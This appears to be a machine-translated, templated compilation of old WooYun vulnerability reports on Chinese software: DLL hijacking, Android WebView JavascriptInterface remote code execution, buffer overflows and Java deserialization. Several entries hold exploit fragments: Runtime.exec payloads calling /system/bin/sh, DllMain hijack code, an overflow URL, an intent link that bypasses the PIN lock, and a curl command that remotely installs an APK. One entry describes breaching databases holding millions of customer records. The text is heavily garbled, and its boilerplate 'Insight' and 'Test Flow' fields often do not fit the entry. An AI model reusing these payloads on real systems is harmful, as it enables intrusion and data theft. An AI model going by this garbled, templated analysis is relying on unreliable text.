**Details**: Kingsoft Networkprotectionmodulekswebshield.dllhasvulnerabilitythisfunctionforHTTPresponse packetenterlineparse,searchdatapacketinwhetherhas"Content-Range:"field,thenforsubsequent"bytes"fieldenterlinesearch,returnaddressputtextv5text,thentextv5startsearch"-",gettextv7,aftertextcall memcpy_0(String, v6, v7 - (_DWORD)v6)copy data intoStringin,andnottextlength,causingbuffer overflow,textarbitrary code executionthroughIDA,briefly inspect the call chain,canlook attothisfunctionisWSARecvtextfunction,textthenistranslated textadoptWSARecvtextdataprogram,loadthisdatabaseafterallhasarbitrary code executionissuethistext,int __stdcall sub_1008D1F0(int a1)functionalsohasoneintegeroverflowvulnerability,text,v10comparison has an issue

**POC**: useieas an example,constructpoc,textlocal80portopenafter,canlook attoparttextcalculator

**Bypass**: Direct exploitation

**Fix**: Strengthen input validation
---

---
### [wooyun-2013-028533] Kingsoft WPShassecurityvulnerabilitycancancausingarbitrary code execution
**Vendor**: a certain softwareVendor | **Year**: 2013 | **Type**: remote code execution

**Meta-thinking**: Trigger signal: functional testing

**Insight**: remote code execution lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify remote code execution-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: WPSpreview versiontextprogramwps.exe,wpp.exe,et.exehasdllhijackrisk,wps.exeinloads at startupwpsrw.dll,wpp.exeinloads at startupwpprw.dllanduofswr.dll,etinloads at startupuofssrw.dll,thesedllindoes not exist locally,iftextputhtmformatfileaddontextfortextmaliciousdllpack together,send to user.textuseropenthe above formatfile,thenwillExecutionmalware,high impact.

**POC**: 1,casually create peoplefilefolder,againputprove vulnerabilitywpprw.dlltexttest.htmputinonetogether,usewpstextopentest.htm,thenwillloadwpsrw.dll,as shown below:2,Poctexthttps://example.com/[redacted]

**Bypass**: Direct exploitation

**Fix**: useLoadLibrary APIloadDLLtextuseabsolute path
---

---
### [wooyun-2014-061992] Open EDXcloud serverremote arbitrary code execution vulnerability
**Vendor**: edx.org | **Year**: 2014 | **Type**: remote code execution

**Meta-thinking**: Trigger signal: functional testing

**Insight**: remote code execution lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify remote code execution-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: [IP redacted]222.249.250.83118.122.124.188Elasticsearchcode executionforeign cases are not listed  notification but nobody fixed ita certain universityifLabcloud computing group

**POC**: (see original)

**Bypass**: Direct exploitation

**Fix**: Strengthen input validation
---

---
### [wooyun-2011-01630] PIPIplayeroverflowvulnerability
**Vendor**: Pipi.com | **Year**: 2011 | **Type**: remote code execution

**Meta-thinking**: Trigger signal: functional testing

**Insight**: remote code execution lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify remote code execution-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: Pipi PlayerinlocationhandleuserinputURLtext,noforitsenterlinelengthcheck.textcauseoverflow.nottext,textforhasGS,exploitwhensomewhat difficultcase 32780:v9 = *(_DWORD *)(wParam + 4096);v22 = 0;v21 = v9;*(_DWORD *)(wParam + 6344) = 1;sub_40D480(v21, v22);v42 = 5;if ( CDialog::DoModal(&v31) == 1&& ATL::CStringT<char_StrTraitMFC_DLL<char_ATL::ChTraitsCRT<char>>>::Find(&v32, "://", 0) > 0 ){v10 = (const char *)ATL::CSimpleStringT<char_1>::operator char_const__(&v32);if ( strnicmp(v10, "p

**POC**: weconstructas followsURL:"ppfilm://AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

**Bypass**: Direct exploitation

**Fix**: foruserinputURLenterlinelengthrestriction
---

---
### [wooyun-2015-0160304] ***customs clearance service platformS2Executionold vulnerability,ROOT permissions.
**Vendor**: a certain electronic port company | **Year**: 2015 | **Type**: remote code execution

**Meta-thinking**: Trigger signal: functional testing

**Insight**: remote code execution lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify remote code execution-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: textfound,itstextyouselftextchecktext.

**POC**: translated textunder13http://**.**.**.**/lisPortal/1.txt

**Bypass**: Direct exploitation

**Fix**: Strengthen input validation
---

---
### [wooyun-2015-0146754] TVMaoremote executioncode
**Vendor**: moretv.com.cn | **Year**: 2015 | **Type**: remote code execution

**Meta-thinking**: Trigger signal: functional testing

**Insight**: remote code execution lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify remote code execution-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: beforelook at12580portsource codewhenfoundip:12580/?action=PlayPushUrloftextcallforistext peoplesoftwaretextclientapk.searchPlayPushUrltranslated textfoundpackettextinsmail/com/peersless/api/j/q.smailfileinsideinsidetexthasonesomewebpagesource codeinsidelook atnottofunctionalityfor exampledoCmd.hastextcanrunandroidsystemcommand(textpermissions)

**POC**: (see original)

**Bypass**: Direct exploitation

**Fix**: youtranslated text.
---

---
### [wooyun-2015-0160384] Hongling Capitala systemjavadeserializationexecution vulnerabilityadministrator privileges
**Vendor**: tzbao.com | **Year**: 2015 | **Type**: successintrusion incident

**Meta-thinking**: Trigger signal: functional testing

**Insight**: successintrusion incident lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify successintrusion incident-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: https://example.com/[redacted]

**POC**: (see original)

**Bypass**: Direct exploitation

**Fix**: Strengthen input validation
---

---
### [wooyun-2015-0165181] a certain municipal human resources and social security bureauweblogicdeserializationvulnerability
**Vendor**: cncertNational Internet Emergency Center | **Year**: 2015 | **Type**: system/service patch not timely

**Meta-thinking**: Trigger signal: functional testing

**Insight**: system/service patch not timely lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify system/service patch not timely-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: targetip:**.**.**.**:7001

**POC**: (see original)

**Bypass**: Direct exploitation

**Fix**: apply patch
---

---
### [wooyun-2012-012232] a certain airlinecode execution
**Vendor**: a certain airline | **Year**: 2012 | **Type**: system/service patch not timely

**Meta-thinking**: Trigger signal: functional testing

**Insight**: system/service patch not timely lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify system/service patch not timely-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: a certain airlinestruts 2code execution

**POC**: (see original)

**Bypass**: Direct exploitation

**Fix**: Strengthen input validation
---

---
### [wooyun-2015-0141878] PPLive videoclientremote code execution vulnerability(withvulnerabilityPOC)
**Vendor**: PPTV(PPlive) | **Year**: 2015 | **Type**: remote code execution

**Meta-thinking**: Trigger signal: functional testing

**Insight**: remote code execution lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify remote code execution-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: PPLive videoclienthasDLLhijackvulnerability. whenweusePPLiveopenonevideotext(for exampleTest.mp4),PPLive.exeprocesswilltryloadvideotextindirectoryd3dx9_43.dllfile. ifputvideofiletextmaliciousDLLfileputinsameonedirectory,packagesendtextvictim,victimtextafteropenvideothenwillaffected.

**POC**: translated textdownloadonetextPPTV(PPLive)videoclient,downloadaddressashttp://**.**.**.**/pptvsetup_**.**.**.**6.exe,look atoneundernumbertextnamedtext:checkunderwhetherislatest versioncopy:textinweneedtextoned3dx9_43.dllfile,code is as follows(parttranslated textproveDLLcanbeload):#include <windows.h>BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason,LPVOID lpReserved ){switch( fdwReason ){case DLL_PROCESS_ATTACH:MessageBoxA(N

**Bypass**: Direct exploitation

**Fix**: inPPLive.exeprocessincallSetDllDirectory(""),putwhentextDLLtextdirectorysetastext.
---

---
### [wooyun-2015-0146592] a certain search enginetextcloudremoteinstall/startapk/desktoptext(enterwifiaftertext)
**Vendor**: a certain search engine | **Year**: 2015 | **Type**: remote code execution

**Meta-thinking**: Trigger signal: functional testing

**Insight**: remote code execution lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify remote code execution-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: http://[IP redacted]  remotestartapphttp://[IP redacted]  translated texthasapphttp://192

**POC**: http://[IP redacted]   sendtranslated textinformationhttp://[IP redacted] willhastexthttp://[IP redacted]

**Bypass**: Direct exploitation

**Fix**: youtranslated text.
---

---
### [wooyun-2012-09299] a certain game platformAndroidclientvulnerabilitycausingarbitrary code executionandpasswordtext
**Vendor**: a certain Internet company | **Year**: 2012 | **Type**: user sensitive data leakage

**Meta-thinking**: Trigger signal: functional testing

**Insight**: user sensitive data leakage lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify user sensitive data leakage-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: a certain game platformAndroidclientadoptmoduletranslated text,textgameuseAPKlineasdownloadtomobile phoneSDtextin,thenthroughClassLoadertextloaditsinclasses.dexfileExecution,textrunnotsamegame.inthistextin,hastwo peopleissue:1. texthasSDtextfilecanbeotherarbitrarytextusesoftwaretext;2. intextloadstoreinSDtextonclasses.dexfilebefore,noforitsintegritytextvalidation.textthis,attackercanreplacealreadydownloadgamefile,replaceaftercodeputinuserstartthisgametextuseExecution.text,ifattackerforthesefileadopttextpackagetranslated textmaliciouscodeorforuserenterlinefraud,cantextenteronetextattack,translated textuserpasswordortextlocalprivacydataetc..

**POC**: 1. aboutSDtextfilecanarbitrarytext,notagainusecodeprove,textuseoneunderofficialtext.inundertextlinkin:https://example.com/[redacted] created on external storage, such as SD Cards, are globally readable and writable. Since external storage can be removed by the user and also modified by any application, applications should

**Bypass**: Direct exploitation

**Fix**: textofficialtext,If an application does retrieve executable files from external storage they should be signed and cryptographically verified prior to dynamic lo
---

---
### [wooyun-2014-068527] a certain textinformationwebsiteremote code execution vulnerability(textallhas)
**Vendor**: a certain textinformationwebsite | **Year**: 2014 | **Type**: remote code execution

**Meta-thinking**: Trigger signal: functional testing

**Insight**: remote code execution lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify remote code execution-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: reference:https://example.com/[redacted] execute(cmdArgs){return Android.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec(cmdArgs);}

**POC**: 1,enter"text"text,textclickonelink,againthroughinsidetexta certain onesomefunctionalitythencan.2,interfacetext.

**Bypass**: Direct exploitation

**Fix**: a certain textinformationwebsitelargecompanynotshouldhastheselowtextvulnerabilitysee:https://example.com/[redacted]
---

---
### [wooyun-2013-040852] AVCONtextmediacommunicationssystemalltextversionhasgeneric remote code execution
**Vendor**: a certain informationtechnology company | **Year**: 2013 | **Type**: remote code execution

**Meta-thinking**: Trigger signal: functional testing

**Insight**: remote code execution lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify remote code execution-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: searchtext:google:inurl:changLang.actionbaidu:AVCON6enterpriseinformationmanagementsystemnetworktext:[IP redacted]  phototemp  orgmanage  forspecial    userinfo   ordmanage  randertemphttptranslated text:<tr><td align="right" valign="middle">translated text</td><td align="left"><a href="changLang.action?request_locale=zh_CN" title="Chinese simplified">

**POC**: (see original)

**Bypass**: Direct exploitation

**Fix**: Strengthen input validation
---

---
### [wooyun-2014-084517] translated textsecuritymobile phones6browserissuepackage
**Vendor**: yulong.com | **Year**: 2014 | **Type**: remote code execution

**Meta-thinking**: Trigger signal: functional testing

**Insight**: remote code execution lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify remote code execution-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: 1,browserintent scheme filternotwhen,textfragmentinjectionBypasspincodepocas follows:(texthttps://example.com/[redacted] href="intent:#Intent;S.:android:show_fragment=com.android.settings.ChooseLockPassword$ChooseLockPasswordFragment;B.confirm_credentials=false;launchFlags=0x00008000;SEL;action=android.settings.SETTINGS;end">16,bypass Pin android 3.0-4.3 (selector)</a>

**POC**: 2,uxsstest address:uxss.sinaapp.com3,textservicestextuseaftercommandExecution

**Bypass**: filterBypass

**Fix**: Strengthen input validation
---

---
### [wooyun-2013-036369] GOSMShas remote code executioncausingdatadatabaseleakage
**Vendor**: goforandroid.com | **Year**: 2013 | **Type**: system/service patch not timely

**Meta-thinking**: Trigger signal: functional testing

**Insight**: system/service patch not timely lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify system/service patch not timely-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: https://example.com/[redacted]

**POC**: (see original)

**Bypass**: Direct exploitation

**Fix**: Strengthen input validation
---

---
### [wooyun-2015-0109220] a certain video siteclienttextnotwhencancancausingarbitrarymalwareexecution vulnerability(systemrestriction)
**Vendor**: text | **Year**: 2015 | **Type**: remote code execution

**Meta-thinking**: Trigger signal: functional testing

**Insight**: remote code execution lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify remote code execution-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: a certain video sitetextcanplayerGeePlayer.exehasdllhijackrisk,SHPlayer.exeinloads at startupopencl.dll,thisdllindoes not exist locally,iftextputthe above formatmediafileaddontextfortextmaliciousdllpack together,send to user.useropenthe above formatfile,thenwillExecutionmalware,high impact.

**POC**: 1,casually create peoplefilefolder,againputprove vulnerabilityopencl.dlltexttest.aviputinonetogether,opentest.avi,thenwillloadopencl.dll,as shown below:

**Bypass**: Direct exploitation

**Fix**: useLoadLibrary APIloadDLLtextuseabsolute path
---

---
### [wooyun-2014-067661] a certain textAPPremote code execution vulnerabilitygirlIcome
**Vendor**: a certain e-commerce platform | **Year**: 2014 | **Type**: remote code execution

**Meta-thinking**: Trigger signal: functional testing

**Insight**: remote code execution lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify remote code execution-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: reference:https://example.com/[redacted])function execute(cmdArgs){return Native_Bridge_laiwang.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec(cmdArgs);}

**POC**: 1,textgirltranslated text2,text people"good"post3,commentlocationreplytestpage:https://example.com/[redacted]

**Bypass**: Direct exploitation

**Fix**: see:https://example.com/[redacted]
---

---
### [wooyun-2016-0169068] a certain translated textjavadeserializationvulnerability
**Vendor**: cncertNational Internet Emergency Center | **Year**: 2016 | **Type**: system/service patch not timely

**Meta-thinking**: Trigger signal: functional testing

**Insight**: system/service patch not timely lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify system/service patch not timely-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: usetoolenterlinejavadeserializationtest.http://**.**.**.**/success

**POC**: http://**.**.**.**/usetooluploadshellsuccess,andExecutioncommandtextbetext,textonetogetherlook atlook attexthttp://**.**.**.**/level3.jsp?id=125

**Bypass**: Direct exploitation

**Fix**: textlargelargethattextadministratorthennotuseItext.
---

---
### [wooyun-2016-0203931] intranslated textmanysystemhasvulnerability/admin backendcompromised/tenseveraldatadatabasecantext/leakagetextcustomerinformation/texttentranslated textuserpassword
**Vendor**: intranslated text | **Year**: 2016 | **Type**: system/service patch not timely

**Meta-thinking**: Trigger signal: authentication interface, admin backendmanagement

**Insight**: system/service patch not timely lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify system/service patch not timely-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: onlyquerytextinformationprove vulnerability,notranslated text,nottextcheckItextintranslated textuseunderservertexthasJAVA weblogicdeserializationvulnerabilitytextlook atlook atNo.oneconsole,connectserver,alreadyhastextcometextunderoneconsole,connectserverthisconsoleserverwebsiteopenafterwilltexttointranslated texta certain textuse,cancanwillhassomeinformationconnectdatadatabasedatadatabaseinsideinformationallistranslated text-.-,textfornumbertextintext,select counttranslated text,directlylook atoracletextinsideNUM_ROWStextinformation,1154Wcustomerinformation,1205Wtextinformation,895Wtextiscustomerinformation,569Wtextaccountinformationtranslated textonelog inadmin backendmanagementsystemtextlook atonelook attranslated textontextsystemtext peopleadministratoruserlook atunderuseadministrator accountlog in,permissionslargetext,cantextmore,textisnottranslated text,translated textissuetextaccounttexthasonetextmanySMSunderlinetext,75WSMSonlinetext,70Wdo not knowSMSonlinecantranslated textconsoleserverlog inthistextoneheapdatadatabaseconfiguration,textistextI=.=againtextconsoleserverlog in,translated textnamedlook atistestusetext

**POC**: see detailed description

**Bypass**: Direct exploitation

**Fix**: apply patchcanreference:FixweblogicJAVAdeserializationvulnerabilitytextmethodhttps://example.com/[redacted]
---

---
### [wooyun-2013-027711] translated textremote code execution vulnerability
**Vendor**: translated text | **Year**: 2013 | **Type**: remote code execution

**Meta-thinking**: Trigger signal: functional testing

**Insight**: remote code execution lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify remote code execution-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: translated textprogramXiuXiu.exehasdllhijackrisk,XiuXiu.exeinloads at startupdwmapi.dll,thesedllindoes not exist locally,iftextputthe above formatmediafileaddontextfortextmaliciousdllpack together,send to user.useropenthe above formatfile,thenwillExecutionmalware,high impact.

**POC**: 1,casually create peoplefilefolder,againputprove vulnerabilitydwmapi.dlltexttest.pngputinonetogether,opentest.png,thenwillloaddwmapi.dll,as shown below:2,Poctexthttps://example.com/[redacted]

**Bypass**: Direct exploitation

**Fix**: useLoadLibrary APIloadDLLtextuseabsolute path
---

---
### [wooyun-2016-0167005] a certain ITgroupa certain sitemanyvulnerabilitypackage
**Vendor**: a certain ITgroup | **Year**: 2016 | **Type**: system/service patch not timely

**Meta-thinking**: Trigger signal: functional testing

**Insight**: system/service patch not timely lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify system/service patch not timely-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: a certain ITgroupa certain sitevulnerabilitypackagesite:**.**.**.**:7001/newsedit/e5workspace/Login.jspissue1:**.**.**.**:7001/console weblogic/weblogicissue2:JAVAdeserializationvulnerability

**POC**: a certain ITgroupa certain sitevulnerabilitypackagesite:**.**.**.**:7001/newsedit/e5workspace/Login.jspissue1:**.**.**.**:7001/console weblogic/weblogicissue2:JAVAdeserializationvulnerability

**Bypass**: Direct exploitation

**Fix**: RT
---

---
### [wooyun-2015-0145718] a certain search enginemobile phonetextremotetextinstallstarttextusevulnerability(3G/4Genvironmentunderremotetext)
**Vendor**: a certain search engine | **Year**: 2015 | **Type**: remote code execution

**Meta-thinking**: Trigger signal: upload functionality

**Insight**: remote code execution lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify remote code execution-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: - droidportPackage                  Proto Recv-Q Send-Q         Local Address          Foreign Address        Statecom.baidu.appsearch tcp6       0      0 :::40310               :::*                   LISTENcom.baidu.appsearch tcp6       0      0 :::7777                :::*                   LISTENfounda certain search enginemobile phonetranslated text40310thistranslated textport,here7777textundernottext.textanalysisandWooYun: a certain search engineinput methodAndroid versionhas remoteobtaininformationcontroluserlineasvulnerability(canmaliciouspush contentetc.4Gnetworkinsidecantexttotarget)textnottranslated textportnumber

**POC**: remoteuploadtextinstalltextusecurl -F file=@1.apk -e https://example.com/[redacted] -H "remote-addr: [IP redacted]" http://[IP redacted] -e https://example.com/[redacted] -H "remote-addr: [IP redacted]" http://[IP redacted]

**Bypass**: Direct exploitation

**Fix**: Strengthen input validation
---

---
### [wooyun-2015-0165303] translated textwebsitehasJAVAdeserializationvulnerability
**Vendor**: translated text | **Year**: 2015 | **Type**: system/service patch not timely

**Meta-thinking**: Trigger signal: functional testing

**Insight**: system/service patch not timely lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify system/service patch not timely-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: **.**.**.**/

**POC**: onlyislook atoneunder,translated text...

**Bypass**: Direct exploitation

**Fix**: use SerialKiller replaceenterlinetranslated textoperation ObjectInputStream textinnottextbusinesstextunder,textdeletetextitemsinside "org/apache/commons/collections/functors/InvokerTransformer.class" file
---

---
### [wooyun-2015-0158826] intexta certain sensitivetextsingletexta systemJAVAdeserializationvulnerability
**Vendor**: intexta certain sensitivetextsingletext | **Year**: 2015 | **Type**: network design flaw/logic error

**Meta-thinking**: Trigger signal: functional testing

**Insight**: network design flaw/logic error lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify network design flaw/logic error-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: mask text*****a systemJAVA^***********.**.************be50d4f9d371082f6ef80b.png*****

**POC**: mask text*****a systemJAVA^***********.**.************be50d4f9d371082f6ef80b.png*****

**Bypass**: Direct exploitation

**Fix**: referenceofficialPatch
---

---
### [wooyun-2015-099276] a certain video siteclientcanbe man-in-the-middle attackexecute code(exploittranslated text)
**Vendor**: a certain video site | **Year**: 2015 | **Type**: remote code execution

**Meta-thinking**: Trigger signal: functional testing

**Insight**: remote code execution lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify remote code execution-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: itstextprerequisitetextistextininstallenterlinetextenterlineman-in-the-middle attack.Ifounda certain video siteclient(https://example.com/[redacted]

**POC**: versionnumber:textafter installingtext,cantranslated textlook attorequesthttps://example.com/[redacted]

**Bypass**: Direct exploitation

**Fix**: textreturnhttps://example.com/[redacted]
---

---
### [wooyun-2015-0114116] a certain Vendortextplugincancausingremotestartcan executemaliciouscode
**Vendor**: a certain computerVendor | **Year**: 2015 | **Type**: remote code execution

**Meta-thinking**: Trigger signal: functional testing

**Insight**: remote code execution lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify remote code execution-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: a certain VendortextpluginDriverCDExport.ocxcontrolOpenItemFilePathfunctionhassecurityissue,cancausingIEuserintextmaliciouswebpagetextberemotestartlocalcan executefile,textcmd,calcetc.,orotherprogram,starttextmalware,orforWindowssystementerlinedenial of serviceattack.

**POC**: undertextthisvideotextthissecurityissue.openNo.oneaddressonlyisstartonecalculator,openNo.twoaddresstextunlimitedloopstartcalculatorprogramcausingWindowsunable touse.https://example.com/[redacted]

**Bypass**: Direct exploitation

**Fix**: Strengthen input validation
---

---
### [wooyun-2014-066836] textbrowserremote code execution vulnerability
**Vendor**: textbrowser | **Year**: 2014 | **Type**: remote code execution

**Meta-thinking**: Trigger signal: functional testing

**Insight**: remote code execution lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify remote code execution-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: downloadtextbrowser:https://example.com/[redacted]

**POC**: searchaddJavascriptInterfacehastwo people,thatthentextsettingconstructonewrite file+popupExp:<html><head><title>test</title></head><body><script>function execute(testcmd){return setting.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec(testcmd);}try{execute(["/system/bin/sh","-c","echo 'WooYun_TES

**Bypass**: Direct exploitation

**Fix**: :)
---

---
### [wooyun-2014-066535] textbrowserremote code execution vulnerability
**Vendor**: textnetwork | **Year**: 2014 | **Type**: remote code execution

**Meta-thinking**: Trigger signal: functional testing

**Insight**: remote code execution lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify remote code execution-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: downloadtextbrowserlatest version:https://example.com/[redacted]

**POC**: searchaddJavascriptInterfacethentextitsinhardwareAccelerateObjectconstructonewrite file+popupExp:<html><head><title>test</title></head><body><script>function execute(testcmd){return hardwareAccelerateObject.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec(testcmd);}try{execute(["/syste

**Bypass**: Direct exploitation

**Fix**: :)
---

---
### [wooyun-2015-099196] Xunleigametextcanbe man-in-the-middle attackcausingtranslated textdenial of service
**Vendor**: Xunlei | **Year**: 2015 | **Type**: denial of service

**Meta-thinking**: Trigger signal: functional testing

**Insight**: denial of service lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify denial of service-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: Xunleigametextopentextwilltexthttps://example.com/[redacted])thisAPIcantextlocalconfigurationfile,notextrestriction.for example:window.external.SetConfigData("~XLGameBoxConfig~", "IsAutoRun", "true")cantextgametranslated textstart.thislocalfiletexthas%APPDATA%\Xunleigame\XLGameBox\Data\xggb_config.ini.becausenouseHTTPS,sointextcanhijackgametextwebpagerequest,this wayintextthen canarbitrarytextlocalconfigurationfile.Itranslated text,textfoundhastranslated textconfiguration,for examplecode execution,downloadfile.Itextnottextthenthistext,sothatthendestroytext.soIthenusesetIntervallooptextconfigurationfileinsidetextlarge amount ofnousetext

**POC**: versionnumber:hijackhttps://example.com/[redacted] html><html><head><meta charset="UTF-8"><title>Test</title><script>var val_w = new Array(1024*1024).join("a");var i = 0;window.external.SetConfigData("~XLGameBoxConfig~", "IsAutoRun", "true"); //translated textstartwindow.external.SetConfigData(

**Bypass**: Direct exploitation

**Fix**: translated textwebpagedirectlymodifylocalfileistext,cannotnottextman-in-the-middle attack.ifyouafteradd acanusecomeexecute codeconfiguration,thatthennottextdenial of servicethistextsingle.textthroughHTTP(textHTTPS)downloadpageiscannottext.soSetConfigDatacannottranslated textwebpagethennottext,translated textuse,textuseHTTPS,textHTTPSwebpagetextcantextset;text
---

---
### [wooyun-2014-066056] textcloudKODExlporertranslated textarbitrary code execution
**Vendor**: kalcaddle.com | **Year**: 2014 | **Type**: design flaw/logic error

**Meta-thinking**: Trigger signal: upload functionality

**Insight**: design flaw/logic error lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify design flaw/logic error-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: https://example.com/[redacted] ,textnamedsuccess,textbetext,filesuffixtextasphpcansuccessExecution.

**POC**: (see original)

**Bypass**: Direct exploitation

**Fix**: youtext
---

---
### [wooyun-2013-046784] translated textplayerremote code execution vulnerability
**Vendor**: translated text | **Year**: 2013 | **Type**: remote code execution

**Meta-thinking**: Trigger signal: functional testing

**Insight**: remote code execution lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify remote code execution-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: translated textplayerlatest version(version3.7 build 2437),officialdownloadinstall versionsSPlayerSetup.exe,windows xp sp4environment,translated textplayerintextputtextTypetextfiletextwillloada certain somenothasdllfile(thesefilenotranslated textplayeronetogetherinstall),causingmaliciousattackercantextDLLfileuseforhijack,textuseropenremotetextundertextfilecomeloadmaliciouscode,seriousimpactusersystemsecurity.withtextas follows:d3dx9_39.dlld3dx9_40.dlld3dx9_41.dlld3dx9_42.dlld3dx9_43.dlld3dx9_44.dlld3dx9_45.dlldwmapi.dlliacenc.dllnvcuda.dll

**POC**: (see original)

**Bypass**: Direct exploitation

**Fix**: textDLLloadtextcheck.
---

---
### [wooyun-2011-03671] Sogoubrowserremote code execution vulnerability
**Vendor**: Sogou | **Year**: 2011 | **Type**: remote code execution

**Meta-thinking**: Trigger signal: functional testing

**Insight**: remote code execution lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify remote code execution-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: onlyneedaddonelinecode,vulnerabilitytexttogethercome.

**POC**: onlyneedputtextontextPOCinsidetest2.html textmodifyonepoint,addonelinealert("It is crashed?"),text peopletranslated text,textruntranslated text,textaftertextquestionthenwilltranslated text,translated textundercanagain timesparttextcalculator.

**Bypass**: Direct exploitation

**Fix**: translated textcome,do not knowtext.
---

---
### [wooyun-2010-0369] a certain securities firmcompanytextontextsecuritycontrolhas remoteoverflowvulnerability
**Vendor**: a certain securities firmcompany | **Year**: 2010 | **Type**: remote code execution

**Meta-thinking**: Trigger signal: functional testing

**Insight**: remote code execution lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify remote code execution-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: file:CsswebUsb.ocxversion:[IP redacted]clsid:30A3ACF9-DA6E-4CA0-A081-E06282DF1C64property:GetErrInfo

**POC**: +target.GetErrInfo(SOMELONGSTR)+HeapSpray+Bingo

**Bypass**: Direct exploitation

**Fix**: restrictionParameterslength
---

---
### [wooyun-2012-09542] a certain translated textremote execution
**Vendor**: a certain translated textcompany | **Year**: 2012 | **Type**: remote code execution

**Meta-thinking**: Trigger signal: functional testing

**Insight**: remote code execution lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify remote code execution-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: translated text  istextontextcompanya certain translated textcompany (translated textnumber0952) textundertextinformationservicewebsite,for1998translated textunicode-FE54istranslated textonetranslated textinformationwebsite,onetranslated textastranslated textand peopletranslated texthastexttool,translated textcanintextwhenwhentranslated text.Quamnetusetextandanalysistranslated textastext,textnamedtranslated textanalysistranslated textcommentarticle,websitetranslated textisalltextlarge,translated textanalysistextofone.

**POC**: (see original)

**Bypass**: Direct exploitation

**Fix**: struts
---

---
### [wooyun-2015-0160397] Yunnan Provincenetworktranslated textservicetextjavadeserializationvulnerability
**Vendor**: a provincialtranslated text | **Year**: 2015 | **Type**: successintrusion incident

**Meta-thinking**: Trigger signal: functional testing

**Insight**: successintrusion incident lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify successintrusion incident-related functionality
2. Construct a test payload
3. Verify the vulnerability response

